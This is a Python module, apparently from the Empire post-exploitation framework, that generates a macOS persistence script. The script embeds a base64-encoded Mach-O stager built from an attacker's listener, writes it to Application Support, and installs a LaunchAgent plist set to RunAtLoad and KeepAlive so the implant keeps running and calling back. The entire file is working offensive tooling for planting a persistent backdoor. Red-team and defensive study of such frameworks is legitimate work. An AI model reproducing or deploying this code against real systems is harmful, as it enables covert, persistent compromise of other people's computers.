import base64
from typing import Dict, Tuple, Optional

from empire.server.common.module_models import PydanticModule


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = "") -> Tuple[Optional[str], Optional[str]]:

        daemon_name = params['DaemonName']
        program_name = daemon_name.split('.')[-1]
        plist_filename = "%s.plist" % daemon_name
        listener_name = params['Listener']
        user_agent = params['UserAgent']
        safe_checks = params['SafeChecks']
        launcher = main_menu.stagers.generate_launcher(listener_name, language='python', userAgent=user_agent, safeChecks=safe_checks)
        launcher = launcher.strip('echo').strip(' | python3 &').strip("\"")
        macho_bytes = main_menu.stagers.generate_macho(launcherCode=launcher)
        enc_bytes = base64.b64encode(macho_bytes)

        plistSettings = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>%s</string>
    <key>ProgramArguments</key>
    <array>
        <string>%s</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>"""

        script = """
import subprocess
import sys
import base64
import os

isRoot = True if os.geteuid() == 0 else False
user = os.environ['USER']
group = 'wheel' if isRoot else 'staff'

launchPath = '/Library/LaunchAgents/' if isRoot else '/Users/'+user+'/Library/LaunchAgents/'
daemonPath = '/Library/Application Support/%(daemonName)s/' if isRoot else '/Users/'+user+'/Library/Application Support/%(daemonName)s/'

encBytes = "%(encBytes)s"
bytes = base64.b64decode(encBytes)
plist = \"\"\"%(plistSettings)s
\"\"\" %% ('%(daemonName)s', daemonPath+'%(programName)s')

if not os.path.exists(daemonPath):
    os.makedirs(daemonPath)

e = open(daemonPath+'%(programName)s','wb')
e.write(bytes)
e.close()

os.chmod(daemonPath+'%(programName)s', 0755)

f = open('/tmp/%(plistFilename)s','w')
f.write(plist)
f.close()

os.chmod('/tmp/%(plistFilename)s', 0644)

process = subprocess.Popen('chown '+user+':'+group+' /tmp/%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
process.communicate()

process = subprocess.Popen('mv /tmp/%(plistFilename)s '+launchPath+'%(plistFilename)s', stdout=subprocess.PIPE, shell=True)
process.communicate()

print("\\n[+] Persistence has been installed: "+launchPath+"%(plistFilename)s")
print("\\n[+] Empire daemon has been written to "+daemonPath+"%(programName)s")

""" % {"encBytes":enc_bytes, "plistSettings":plistSettings, "daemonName":daemon_name, "programName":program_name, "plistFilename":plist_filename}

        return script

